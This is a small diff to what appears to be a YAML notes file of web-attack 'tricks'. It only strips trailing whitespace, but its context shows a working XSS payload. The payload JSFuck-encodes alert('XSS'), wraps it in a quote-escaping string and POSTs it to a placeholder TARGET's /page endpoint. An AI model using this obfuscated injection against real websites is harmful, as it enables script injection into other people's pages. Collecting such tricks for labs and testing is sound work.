@@ -47,9 +47,8 @@ tricks:
     how: "POST to /page with JSFuck payload"
     payload: |
       import subprocess
-      jsfuck = subprocess.run(['node', '-e', 
+      jsfuck = subprocess.run(['node', '-e',
           "console.log(require('jsfuck').JSFuck.encode(\"alert('XSS')\",true))"],
           capture_output=True, text=True).stdout.strip()
       payload = '";' + jsfuck + ';_="'
       requests.post('http://TARGET/page', data={'name': payload})
-
